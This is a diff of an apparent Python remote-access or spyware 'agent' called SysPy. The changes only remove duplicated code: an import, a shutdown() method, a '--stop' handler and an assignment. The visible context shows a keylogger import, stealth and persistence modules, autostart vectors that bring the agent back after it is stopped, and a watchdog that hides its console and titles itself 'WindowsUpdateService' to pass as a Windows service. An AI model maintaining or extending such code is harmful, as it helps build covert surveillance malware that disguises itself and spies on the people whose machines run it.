@@ -21,7 +21,6 @@ from . import (commands, health, persistence, runtime, session, stealth,
                sysinfo, updater)
 from .inputs import Keylogger
 from . import machine_state
-from . import machine_state
 
 #: Concurrent command ceiling. A broadcast otherwise spawns one thread per
 #: message with no limit.
@@ -403,30 +402,6 @@ class Agent:
             pass
         os._exit(code)
 
-    def shutdown(self, code: int = 0) -> None:
-        """Disconnect cleanly, drop the lock, then exit.
-
-        A bare ``os._exit`` from a worker thread skipped ``finally`` blocks and
-        left stale locks behind. The MQTT will already covers the offline blip
-        on an update, so a real DISCONNECT is the correct goodbye everywhere
-        else.
-        """
-        self._running = False
-        try:
-            if self._client is not None:
-                self._client.publish(
-                    config.topic_up(self.agent_id),
-                    self.codec.encode({"t": "bye"}), qos=0)
-                time.sleep(0.15)
-                self._client.disconnect()
-        except Exception:
-            pass
-        try:
-            stealth.release_single_instance()
-        except Exception:
-            pass
-        os._exit(code)
-
 
 def main(argv: list[str] | None = None) -> int:
     """Entry point for ``agent.py``."""
@@ -481,13 +456,6 @@ def main(argv: list[str] | None = None) -> int:
             print("  [i] autostart vectors kept - the agent returns within ~5 minutes.")
             print("      agent.py --uninstall --force   removes it completely.")
         print("Done.")
-        return 0
-
-    if "--stop" in argv:
-        print("Stopping SysPy agent (autostart vectors kept)...")
-        for action in persistence.stop():
-            print(f"  [x] {action}")
-        print("Done. The agent returns at the next logon.")
         return 0
 
     if "--stop" in argv:
@@ -588,7 +556,6 @@ def _watchdog_main() -> int:
     stealth.write_pid(lock, os.getpid())
     stealth.set_console_title("WindowsUpdateService (watchdog)")
     stealth.hide_console()
-    yielded = False
     yielded = False
 
     entry = os.path.join(stealth.bundle_root(), os.path.basename(sys.argv[0]))
